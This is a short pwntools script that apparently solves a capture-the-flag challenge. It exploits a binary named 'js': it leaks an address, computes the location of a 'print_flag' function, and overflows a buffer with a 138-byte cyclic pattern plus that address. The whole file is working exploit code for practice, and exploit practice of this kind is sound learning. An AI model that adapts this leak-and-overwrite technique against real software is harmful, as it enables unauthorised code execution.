#!/bin/python
import pwn

p = pwn.process("js")
# p = pwn.gdb.debug("js")

p.recvuntil("=")
p.sendline("7922")

p.recvuntil("= ")
addr = pwn.u32(p.recv(4))
addr += 0xeed

p.sendline(pwn.cyclic(138) + pwn.p32(addr))
p.interactive()

# 0x5655830c @ totally_a_num + (0xbf38-0xa046)
# 0x5655830c @ totally_a_num + 0x1ef2 (decimal 7922)
# print_flag @ 0x565591f9, add (0x91f9-0x830c = 0xeed) to leaked address
